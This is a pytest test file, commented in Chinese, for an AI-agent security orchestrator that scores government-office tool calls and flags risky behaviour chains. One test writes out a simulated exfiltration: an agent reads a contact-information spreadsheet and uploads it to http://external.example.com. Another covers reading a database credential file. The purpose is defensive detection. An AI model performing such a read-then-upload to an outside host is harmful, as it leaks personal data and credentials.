"""
Phase 2：行为链风险闭环测试。

覆盖：
- 正常政务办公行为链不误报
- 敏感资产读取产生行为信号
- READ -> EXFIL 产生 HIGH_RISK_DATA_EXFIL_CHAIN
- CRITICAL 资产访问事件
- task_context 兼容透传
"""

from src.security import create_orchestrator


def test_normal_government_workflow_not_blocked():
    orc = create_orchestrator()
    session_id = "behavior-normal"

    steps = [
        ("read", {"path": "政策解读-优化营商环境.md"}),
        ("read", {"path": "园区企业统计数据.xlsx"}),
        ("generate_report", {"content": "2026年Q2园区企业服务报告"}),
        ("upload_file", {"file": "园区企业服务报告.pdf", "target": "市数字化发展中心"}),
    ]

    for tool_name, params in steps:
        result = orc.check_tool_call(
            session_id,
            tool_name,
            params,
            agent_id="admin_agent",
        )
        assert result["action"] == "allow"
        assert result["behavior"]["behavior_score"] == 0


def test_sensitive_asset_read_creates_behavior_signal():
    orc = create_orchestrator()
    result = orc.check_tool_call(
        "behavior-contact-read",
        "read",
        {"path": "企业联系人信息.xlsx"},
        agent_id="admin_agent",
    )

    assert result["asset"]["matched"] is True
    assert result["asset"]["asset_type"] == "personal_information"
    assert result["behavior"]["behavior_signal"]["pattern"] == "HIGH_ASSET_ACCESS"
    assert "read_high_sensitive_asset" in result["behavior"]["behavior_signal"]["evidence"]
    assert result["behavior"]["behavior_score"] >= 0.1
    assert result["risk_score"] >= 0.5
    assert result["action"] != "allow"


def test_high_risk_data_exfil_chain():
    orc = create_orchestrator()
    session_id = "behavior-exfil-chain"

    first = orc.check_tool_call(
        session_id,
        "read",
        {"path": "企业联系人信息.xlsx"},
        agent_id="admin_agent",
    )
    second = orc.check_tool_call(
        session_id,
        "upload_file",
        {"file": "企业联系人信息.xlsx", "target": "http://external.example.com"},
        agent_id="admin_agent",
    )

    signal = second["behavior"]["behavior_signal"]
    assert signal["pattern"] == "HIGH_RISK_DATA_EXFIL_CHAIN"
    assert signal["risk_increment"] >= 0.3
    assert "read_high_sensitive_asset" in signal["evidence"]
    assert "exfil_after_sensitive_read" in signal["evidence"]
    assert second["behavior"]["behavior_score"] > first["behavior"]["behavior_score"]
    assert second["action"] != "allow"


def test_credential_asset_read_signal():
    orc = create_orchestrator()
    result = orc.check_tool_call(
        "behavior-credential-read",
        "read",
        {"path": "数据库连接配置.txt"},
        agent_id="admin_agent",
    )

    assert result["asset"]["matched"] is True
    assert result["asset"]["sensitivity"] == "CRITICAL"
    assert result["behavior"]["behavior_signal"]["pattern"] == "CRITICAL_ASSET_ACCESS"
    assert "read_critical_asset" in result["behavior"]["behavior_signal"]["evidence"]
    assert result["action"] in ("block", "kill")


def test_task_context_is_forwarded():
    orc = create_orchestrator()
    task_context = {
        "goal": "整理2026年Q2园区企业服务报告",
        "allowed_assets": [],
        "allowed_destinations": ["市数字化发展中心"],
    }
    result = orc.check_tool_call(
        "behavior-task-context",
        "read",
        {"path": "政策解读-优化营商环境.md"},
        agent_id="admin_agent",
        task_context=task_context,
    )

    assert result["task_context"] == task_context
    assert result["behavior"]["operation_history"] == ["READ"]
